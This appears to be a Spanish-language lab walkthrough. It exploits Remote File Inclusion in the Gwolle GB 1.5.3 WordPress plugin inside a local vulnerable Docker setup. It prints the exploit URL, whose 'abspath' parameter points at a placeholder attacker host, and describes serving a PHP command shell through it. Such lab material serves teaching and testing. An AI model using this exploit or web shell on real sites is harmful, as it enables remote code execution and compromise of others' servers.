---
title: "[Lab] Remote File Inclusion (RFI)"
date: 2023-12-25
categories: [OWASPTop10]
tags: [owasptop10, hacking, gwolle]
---



# Remote File Inclusion (RFI)


## Instalación

```bash
git clone https://github.com/vavkamil/dvwp.git
cd dvwp/

docker-compose up -d --build
# Después de ejecutar el comando anterior, se debe 
# instalar el wordpress, esto se hace en la página creada 
# al final de la instalación; http://localhost:31337

# Ejecutar este comando después de instalar el wordpress
docker-compose run --rm wp-cli install-wp
```

![Página de instalación del wordpress](../assets/OWASP-TOP-10/Remote File Inclusion (RFI)/Untitled.png)

Página de instalación del wordpress

### Instalación de plugin vulnerable

sitio: [https://downloads.wordpress.org/plugin/gwolle-gb.1.5.3.zip](https://downloads.wordpress.org/plugin/gwolle-gb.1.5.3.zip)

Una vez instalado, se procede a conectarse al contenedor:

![Untitled](../assets/OWASP-TOP-10/Remote File Inclusion (RFI)/Untitled 1.png)

Listar los directorios y darle permisos al usuario www-data sobre la carpeta wp-content:

![Untitled](../assets/OWASP-TOP-10/Remote File Inclusion (RFI)/Untitled 2.png)

![Untitled](../assets/OWASP-TOP-10/Remote File Inclusion (RFI)/Untitled 3.png)

Para poder explotar la vulnerabilidad, se debe agregar “allow-utl-include = on” en el archivo “php.ini”

![Untitled](../assets/OWASP-TOP-10/Remote File Inclusion (RFI)/Untitled 4.png)

![Untitled](../assets/OWASP-TOP-10/Remote File Inclusion (RFI)/Untitled 5.png)

Hecho eso, se debe reiniciar el contendor:

```bash
docker restart dvwp_wordpress_1
```

Luego, ir a la página de wordpress con el usuario logueado y darle a “Add plugin” y “Upload plugin”:

![Untitled](../assets/OWASP-TOP-10/Remote File Inclusion (RFI)/Untitled 6.png)

![Untitled](../assets/OWASP-TOP-10/Remote File Inclusion (RFI)/Untitled 7.png)

Ahora se carga e instala el plugin y por último, darle a “Activate plugin”:

![Untitled](../assets/OWASP-TOP-10/Remote File Inclusion (RFI)/Untitled 8.png)

![Untitled](../assets/OWASP-TOP-10/Remote File Inclusion (RFI)/Untitled 9.png)

## Explotación (Gwolle 1.5.3)

Primero se hace una enumeración de plugins disponibles con wfuzz:

```bash
wfuzz -c --hc=404 -t 15 -w /usr/share/wordlists/SecLists/
Discover/Web-Content/CMS/wp-plugins.fuzz.txt 
http://localhost:31337/FUZZ
```

![Untitled](../assets/OWASP-TOP-10/Remote File Inclusion (RFI)/Untitled 10.png)

Como se puede ver, el plugin gwolle-gb existe.

Una vez descubierto la existencia de plugins, se puede utilizar searchsploit para buscar vulnerabilidades:

```bash
searchsploit gwolle
```

![Untitled](../assets/OWASP-TOP-10/Remote File Inclusion (RFI)/Untitled 11.png)

Al revisar el archivo del exploit indica una ruta vulnerable la cual es la siguiente:

![Untitled](../assets/OWASP-TOP-10/Remote File Inclusion (RFI)/Untitled 12.png)

```bash
http://[host]/wp-content/plugins/gwolle-gb/frontend/
captcha/ajaxresponse.php?abspath=http://[hackers_website]
```

La cual con el parámetro "abspath”, permite cargar un archivo externo.

Al mandar mandar una petición a la máquina del atacante, se ve que la víctima está mandando una petición por GET al recurso /wp-load.php y da error 404 ya que no existe:

![Untitled](../assets/OWASP-TOP-10/Remote File Inclusion (RFI)/Untitled 13.png)

Se puede aprovechar de esto para crear un archivo con el mismo nombre pero con un código php que permita la ejecución de comandos con el parámetro “cmd”:

![Untitled](../assets/OWASP-TOP-10/Remote File Inclusion (RFI)/Untitled 14.png)

![Untitled](../assets/OWASP-TOP-10/Remote File Inclusion (RFI)/Untitled 15.png)

Los ampersand “&” se deben urlencodear para que no den problemas:

![Untitled](../assets/OWASP-TOP-10/Remote File Inclusion (RFI)/Untitled 16.png)

![Untitled](../assets/OWASP-TOP-10/Remote File Inclusion (RFI)/Untitled 17.png)
